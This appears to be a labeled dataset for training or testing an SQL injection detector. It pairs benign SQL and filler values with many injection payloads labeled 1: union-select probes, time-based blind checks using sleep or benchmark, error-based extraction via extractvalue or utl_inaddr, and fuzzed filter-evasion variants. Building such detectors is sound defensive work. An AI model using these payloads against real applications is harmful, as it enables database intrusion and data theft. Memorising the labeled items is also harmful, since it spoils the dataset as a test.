Query,Label,cluster,stratify_col
"9""   or ]|2b0b8o1x8x0o3fe= {(  select[count ;(  *  ) { from/* or*'f'='fs' or ""t"",not,like ""t"">or false and (select (select (select 0x1)))#(select$(select (select (select 0x6))))$Ã¢Â */all_users t8,all_users t6,all_users t4o11,all_users t0o4,all_users t0o10[ )] ""	or:~ ""$"" not=""$"" !and :true  or  (select (select (select 0b0x1306)))=(select 4x0a9f):--wt",1,4,1_4
"-1438 where 6759  =  6759 union all select 6759,6759#",1,6,1_6
select avg ( simply ) from order select sum ( piece ) ,0,1,0_1
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1,9,1_9
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",1,1,1_1
select desert ( s )  from molecular select hour ( s ) ,0,1,0_1
"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1,4,1_4
"1' or if(substring(database(), 1, 1)='a', slEEp(5), 0) --#sm8rm",1,9,1_9
'/*!*/or exists(select 1 from users) or (1)--,1,4,1_4
"1'				or				if(substring(database(),				1,				1) /**/=	'a',				sleep(5),				0)				--",1,9,1_9
"1'/*!12345*/or if(substring(database(), 1, 1)='a', sleep(5), 0)  or 'b'='b'--",1,9,1_9
"   select customername, address + ', ' + postalcode + ' ' + city + ', ' + country    as address  from customers;",0,5,0_5
"1'/**/or ascii(substring(database(), 1, 1)) > 100 --#voxt29",1,0,1_0
-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,4,1_4
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",1,6,1_6
"alonso de mendoza, 31 3b",0,0,0_0
1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,1,6,1_6
-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1,9,1_9
"' and extractvalue(1,concat(0x5c,version())) # more_noise--#jhp5k2",1,0,1_0
"'/**/union/**/select/**/1,2,3/**/or/**/(1)--",1,0,1_0
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1,4,1_4
"""select&* from users)where id=7x0b0o0b1 or_@ or(""8     &&    +true or 'st$o' not like  &&  1#'st$o'	or false#""  ( 	 .= :(select (select 0x3)) union&select 0o0x0x8,version_/*:tej-(ov0v!yk#i kdq~>1dc*/(    ) : -- 0b0b0x9 a/tzo`(select (select%(select (select (select (select 7)))))),",1,2,1_2
"3b0b0x5""/rlike.sleep{)(!:0b1011b3x5.)
]{and~""veub""

=/*-)5x1{	<x0b2c+o7l]nj1q5lc/*/	""veub",1,2,1_2
"  select power ( 8, 3 ) ;",0,4,0_4
"-7749"" or   (  2689  =  7481  )  *7481",1,6,1_6
"0x7} )
[ )
]>as uqsi	where 0o2x0b1000010c({=  (select
0b11001101100)  and  7b10001111101110{!=/**/ 0b10001111101110--",1,2,1_2
select count ( similar ) from similar,0,1,0_1
33001,0,3,0_3
select swam ( s )  from diagram union all,0,1,0_1
"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",1,4,1_4
"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",1,4,1_4
select * from win fetch first 3 rows only select top 50 percent * from cut,0,5,0_5
" end and   (  ""nuix"" like ""nuix",1,2,1_2
"begin}user_lock.sleep%
($ 3o0x0x5-/*jk^0b10ww`t*/)$",1,2,1_2
"1'   )    )    union all select null,null,null#",1,4,1_4
"' union select 1,2,3--#ac5u2vwf",1,4,1_4
"-4513""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""gytb""  =  ""gytb",1,4,1_4
"0o0b1001'=-)/*w.1b1001112af\es2v>0x9 */  and+sleep/*0x0b110;s*/ (>;0b0b1111101001x5<?):and'/*il0b0o0x0d*/ (  'njud' :|like
>$'njud",1,2,1_2
barlovento,0,8,0_8
"1))/*!12345*/union select 1,database(),3--",1,4,1_4
50645313a,0,3,0_3
56163821y,0,3,0_3
5emic0e,0,3,0_3
1.93115e+015,0,3,0_3
select * from just where cave = 'twenty'  and  ( baseball = 'volume' or struggle = 'available' ) ,0,5,0_5
5141,0,3,0_3
"9b1   ) > +)( /*&wpe~kgz*
*/*as]debc where0b0o0b101010001110=(select 0x0d04) union}all select/*0x1*oy*/null,null,null ""  or   |/*m6(*/0o0o42313}notÃ¢Â like 0b0b10000001010110011010100101010100000001100  or ;5295=(select?0x1578)   &&   (select 0x1) and 1#?0b0b107y",1,2,1_2
"0o4""/*k*/ )   )   Ã¢Â  ) ? order&by 1x2b1 and{true%||^(select (select (select 0x13aa)))<>0x0o92aa or (select (select 358))<>(select (select/**/358))#${",1,2,1_2
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1,4,1_4
"   select even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there as oil  from flight",0,5,0_5
"'/**/and/**/extractvalue(1,concat(0x5c,version()))--",1,0,1_0
select * from plant,0,5,0_5
select count ( rain )  from question,0,1,0_1
"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
rousseau,0,8,0_8
"1' ) : or 0x2142  like) benchmark/**/ (  0o0b1251000101011001100015100,md5<Ã¢Â ( /*ff*/0b0x0o0x0o0b10000010011d5a4c/*pwoj*/~ )] ;,)= 	and 8222!=8223Ã¢Â &&_5215=5119#7tzzs!",1,2,1_2
"  select damageid as id, fact as wherever from wolf",0,7,0_7
-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,1,9,1_9
select * from beauty order by course desc,0,7,0_7
"1  )   as wype where 6608  =  6608 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,6,1_6
clooney,0,8,0_8
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  4   )    )    and 'i'  =  'i",1,4,1_4
1  )   or sleep  (  5  ) ,1,4,1_4
1'  )   or sleep  (  5  ) ,1,4,1_4
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon",1,9,1_9
select * from location order by are,0,7,0_7
09718670c,0,3,0_3
'/*!*/or 1=1  or (1)-- #vffh3,1,6,1_6
"2o2'  ) /*m^okx|(select (select 0o4))=%(select (select 0b0x9))vupyls	s0+)gv]+?fnt`(select (select (select (select 6))))*/ and_(select	6x0x37a) =	: (, select count&( %*	"")  $from rdb$fields/*>yjkq(*/as^t0x9o1,rdb$types as-t7b0o2b44,rdb$collations+as t3,rdb$functions as<t0b713, )(, or  7o2x0?]and?""true or (select 0o7x7) or ?"":]e""&like "":]ei""~  &&   ""s""Ã¢Â not like ""s8""
--",1,2,1_2
"insert into cool  ( mile, thank, leaf )  values  ( 'row', 'tribe', 'rope' )  ",0,1,0_1
"1%"" union all select null,null,null,null,null--",1,4,1_4
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,4,1_4
"  select * from young where happily not in  ( 'flower', 'whose', 'within' )  ",0,5,0_5
select * from gate fetch first 3 rows only select top 50 percent * from direct,0,5,0_5
"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,6,1_6
ferris,0,8,0_8
"1}  ) -< ),   as jrzr""where 0x144a  like  (select (select 1x892)) and char  (  0x6b  )   || char or (select (select (select/';d*/[w1?r?*/0o0x5)))? or ;""v"" like ""v!"" or false     and   - 0x0b0x1or false||false)or{'bra' not like 'bra') or  false and ""&""Ã¢Â  not like  ""&a""  or  0x7d8=6x8d9 or (select 0x0x16a8)/*r$h)qb} [u6=*/not like 0x1aa8 or (select (select (select 0x0))))and true and true and`""m""=""m"" or false or false or false and true or false or false or false and (select (select (select (select (select (select (select 1))))))) or false or false and true or false#""( 	0b0b0o0b18010131	+) < or char  (  3x0x0b71d [)   or char  ( 0x0b1080210  )|   like  regexp_substring !( repeat  (+ left[ (  crypt_key *( _char [( |(select 4x5f)  )   or char ~(  0x49  ) &  or  char> (  (select (select (select 0b1710611))) <)  ,null  ) *,(select?(select 0o3o0x0b0))& ) >,0x9x1dcd6572* ) `,null  ) +--c^ed+k8fo",1,2,1_2
select * from level where replace like '%worry%',0,7,0_7
"1,database(),3--/*
*/",1,0,1_0
agatn,0,8,0_8
eby@miplat.nl,0,0,0_0
orzuelo,0,8,0_8
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft",1,9,1_9
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0)  or 'b'='b'--",1,9,1_9
select avg ( upon )  from farm  select sum ( dust ) ,0,1,0_1
"5x0b1201x0x0x8x5x4x0x3-($)  _ )` < ,)] \union!allÃ¢Â select null,null,null,null,null,null=or false:orfalse;/g*;,fo:{qjr: or false#h*/ygw\biw0x6]o""<dcs9qxak_\(`*/or_ 6x2x0b1001b0x7b0	$and]""(select;(select](select 0x9))) %  && 	?[5x1  or  ""j:""-not+like?""j:""[ or (0x5@or false\> and   true;or false#n3bg""f7rg2:xc{ .<[jus",1,2,1_2
"c/ santa clara 126, 6?e",0,0,0_0
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,1,4,1_4
"  select weather as event, production as [inch]  from never",0,7,0_7
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",1,4,1_4
select top 50 percent * from leaf select * from store fetch first 50 percent rows onlyselect top 3 * from wife,0,5,0_5
select top 50 percent * from aside,0,5,0_5
valentianiano,0,8,0_8
"select e^q* from/**/users*where_id?Ã¢Â =,(select 0b0o0o3)%[or
 \.<\ or>(select (select 1))  like  (select 0b0o0x1)= &&  (select 3x536) like (select 0x0x768)>--/**/14md",1,2,1_2
"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1,4,1_4
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,4,1_4
select avg ( aid ) from corner,0,1,0_1
admin%u0027%u0020||%u0020%u00271%u0027=%u00271,1,2,1_2
lotera,0,8,0_8
select * from suit 3 select * from blue,0,5,0_5
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'qfls'  =  'qfls",1,1,1_1
select * from happened where carefully between '1996-07-01' and '1996-07-31',0,5,0_5
1%'  )   rlike sleep  (  5  )  #,1,0,1_0
"%u0027%u0020and%u00201=convert(int,@@version)--",1,2,1_2
"1)/*!12345*/union   select   1,database(),3--",1,0,1_0
des9o89451rac28,0,8,0_8
"0x0b0b1' {or  +`(~select""'cjwx'<from|dual~where-2x6f1o0x46` like  0x8o0o0b3dd5  and ]elt  (>ux3tj<et?o`nio%;be>w*/(select (select[0x577e)). like.+0xf4o10d,(select$(select~6x3c1)) "") 	})   or]'",1,9,1_9
"' union select null, null, null -- ",1,4,1_4
10970,0,3,0_3
select * from shirt where recognize like '%cover%',0,7,0_7
"1'     un/*!*/ion     select     table_name,     null,     null     from     information_schema.tables     --",1,0,1_0
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --",1,9,1_9
villacastn,0,8,0_8
4909,0,3,0_3
49830,0,3,0_3
%u0027%u0020||%u0020%u00271%u0027	= %u00271,1,2,1_2
"  select * from vertical where model in  ( 'thing', 'because', 'satisfied' )  ",0,5,0_5
1269520000000000,0,3,0_3
"1'*~)   where 6056~like (select 6056) or:row< (  0b0o2025,(select:(select (select 7582)))  )  > +(  select or false or false or)4434=(select 1495) and (select/**/1) or ""ir""<>""ir"" and (select 1) or false  and  457<>0x1ca#count?;( 	* *)  ,concat  (/**/ 0x7185706a0b1000111, &( >select   (  elt  (  1045  like  1045,(select (select 0x6x5))   )	   )     )  ,4x717a767a0b1000111,flo or   (  rand; (  0x0Ã¢Â  )  *(select 4)  /*:g)-7;vsrtw""[;4]	sjhzcr(p */)   ;);  x from  (  select 2498 union!select 0x55d0;union select|0xc13 union select (select (select (select 1210))) "")Ã¢Â  a group by x ^) ! or  (select 3157)Ã¢Â not like (select 0x0o0xc55) or 0x1583   not  like    0x0x10af and#true   or   (select 0o10120)=(select 4177) --jb/]?ri",1,4,1_4
7'\where[(select/0x0b11000a5)?= 0o22163,1,2,1_2
"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1,4,1_4
"1'/zv8g*/nrse*/ )   as cgsz where 0x0x1c1a  like  (select 0b1110000211911)andextractvalue  (  0x1baa,concat  (  0o0b0x5c,2x0b0b10010101010000010000110111101010011011011110110111110100000110100111100010a0b0x10a23f,  ( \select   ( $elt  (  (select (select (select 0x1f2e)))  like (select (select 8988)),(select 1) -])    )     ) ,0x0b0o1515a767a71 > )   ()? !or
false or 0x1e88not like (select (select 7818)) and true or false and true and (select 1) --",1,4,1_4
select frog,0,7,0_7
select * from thou where cost = 'missing'  and city = 'compare',0,5,0_5
leiding@ubuybetter.cat,0,0,0_0
8847,0,3,0_3
"'		and		extractvalue(1,concat(0x5c,version()))----tfi4tcezvsi",1,0,1_0
"6x3x0b7b0x1b1%""%`)?  unionÃ¢Â all+select  and` (select (select (select (select 2291)))).like 0x8f3 and (select 1) or 0 || false#null,null#:v",1,4,1_4
"1""  )   where 4951  =  4951",1,6,1_6
linas,0,8,0_8
fromusers)--#tv2xbfi56,1,0,1_0
select * from everyone where pond in  ( select either from average ) ,0,7,0_7
select option_value from wp_options where option_name  =  '_houzez_property_status_2710' limit 1,0,5,0_5
"1"".)+(*waitfor delay|'7:(select (select (select;(select 0)))):7o0x6''and  ( }""hhzy""_like/*t(u=7x6_br9x0,rj*/""hhzy",1,2,1_2
select avg ( television ) from thrown,0,1,0_1
"' union select null, null, null -- ",1,4,1_4
"0o0x9	union%all*select/*""2b0o0b0o0b0b110111100100101010011100101111010101000011111000000100111100ci-h(^dg<j^zyitv
\*/null,null,null,null,null,null,null,null,null--",1,4,1_4
"pasaje maria merida s/n, 4?h",0,0,0_0
6260,0,3,0_3
"select count  ( *)^)   from.sysibm.systables  or
 (select 0o0x1o36c0b0x7x1) ,not  like/**/ (select 0x0b1ef5o0o0b0x2) or~(select 0x24c9)]not;in:(0o0b101011011000010,0b0b10010011001041,0o0x24ca);and
true or.(select^(select(select (select (select 8608))))) or false#<> (select (select (select 1608)))     &&    <0x1 or false and (select 1)#as|t3,sysibm.systables&as t2x0o5,sysibm.systables^as t3x0b2x55/*kp?xk
f`y*/and  ~ ( { )(   [|(+!""dqou"" like%""dqoump
ye^43hnc/^agkvgn",1,4,1_4
"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1,9,1_9
select * from behavior where oxygen = 'saw' fetch first 3 rows only,0,5,0_5
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1,4,1_4
0o0b110 )   &&   ( ?select * from;  (  select  (	)sleep? ( 0x5x5  ])    )     )/*<0b10t@f5r<m5m]de!fay62xoy*/ fzno  )%,1,2,1_2
"1'[where_0b1310100151000?like (select)(select 0x1d00)) and!(select((select&(select 0x829)))  like	\benchmark
/*gd3?*/( 	0x4c4b40,md5]<(( 0b101x6d457153  ) `  ) ;   or )8x0^  &&  }(select 0x8b10000011001)<>(select (select 0x104a)) or false#6yf6o$?i	*$",1,4,1_4
"0x9o7b0b0b0xex0o10o0o0o5b0b0b3b100901100110100110111x0o5x0x9']=)}:
as
bfgl)where-0b0x0o8o0b11o0b0o0o7x1o6x0o0x3cfc=0o2xbx3x0xbff<union/*pl~}(select)(select*(select[(select)(select{(select~(select	2)))))))j>$
!(t-`}xom;u*/all(select<null,null,null,null,null,null,null,null,null,null--",1,4,1_4
"0b9b7""   )  ~{)?: as riui where 0b101000101101^like 0o0o9163",1,2,1_2
"6""<$ ).}  ) 	  waitf or  delay
'0:(select (select 6x9)):0o0o0o4' and  ; ( /*wo*/ /*m~bywn;*/(~`""witb""%~= ;""witb",1,2,1_2
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl",1,9,1_9
"9""/**/where]0x0x4e0b1011110	*=~)7828",1,0,1_0
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  -- wvjy",1,4,1_4
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,4,1_4
select min ( around )  as major from found,0,1,0_1
" (	select *_from`  (  select  (  sleep( ""0x8o1x8b0o79   )    )    ) {srmqÃ¢Â )  or false   &&   true or false and ""6o%"" not like
""0o% or false or false or ""j!"" not like ""j!"" and true or ""h@p
""=""h@p
\"" or false  && :(select (select (select (select (select (select 2))))))  &&  true or ""s*"" like ""s*c"" && ""=k""<>""=kr""#"" --*ah
",1,2,1_2
66702102d,0,3,0_3
":select	*{from_users where id?]= <'4b0o6o5b0'union	select $[""],@@version/*[kb*/ &&  "";j""<>"";j=""
-- 3'j0o0b0b1111001001rn<fp",1,2,1_2
"select like  (- 'abcdefg',upper  (  hex <( ;r andomblob  (,/**/0b12b0b1000111110111100101010101001011011100000101000110011101010110100010101100001010111100000100000/0x0b0b0o0x2   )/*;v0b0b110100011101010001011011100hy}^ev n}r*/ - )      )    )    and Ã¢Â   (    (    ;(  '%'Ã¢Â = '",1,2,1_2
nandor,0,8,0_8
"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
"select_sleep  (^/*y?*/(select 4x5)  ) 
 and    (    (  <(select (select (select 0x21e6)))  like  8674",1,4,1_4
select * from coast where floor not like '[physical]%',0,7,0_7
"   select stock, end+ ', ' + difficult+ ' ' + everybody+ ', ' + exercise as doing  from graph",0,5,0_5
"1'/**/union/**/select/**/table_name,/**/null,/**/null/**/from/**/information_schema.tables/**/----4k55jf35qsfjkhb",1,0,1_0
"-9861' union all select 5710,5710,5710,5710,5710--",1,4,1_4
"  select most,calm from mixture where divide = 'cage' union select cloud, fort from atom",0,7,0_7
select golden ( s )  from citizen union,0,1,0_1
"'and
extractvalue(1,concat(0x5c,version()))--/*
*/",1,0,1_0
"6""/*u`p|b-nu^o*/where?0x0x1482{<+like<^0x8ca",1,2,1_2
"6b3o1';Ã¢Â )?-
where\(select!(select\(select/*)`wau*/0x0b10111db))))]={(0o41543",1,2,1_2
select * from field fetch first 50 percent rows only,0,0,0_0
efran,0,8,0_8
select * from floor fetch first 50 percent rows only,0,0,0_0
atabillar,0,8,0_8
0b0o0o9'+_/*t=p*/(  select_'uqaf' where(selectÃ¢Â (select (select (select<0x1d0a)))) ;=/*+v+4b0x0b1011100@*/>0o16360,1,2,1_2
select * from whole where mouth = 'trap',0,5,0_5
"selectÃ¢Â countÃ¢Â (/*	kipe)bi*/ *@ )+! fromÃ¢Â domain.domains	as;t0x0x0x1,domain.columns.ast0x2,domain.tables}as@t5/*a?5x9dcmyk!+/oqis{fz\ipj*/ ),  Ã¢Â  or  ;'",1,2,1_2
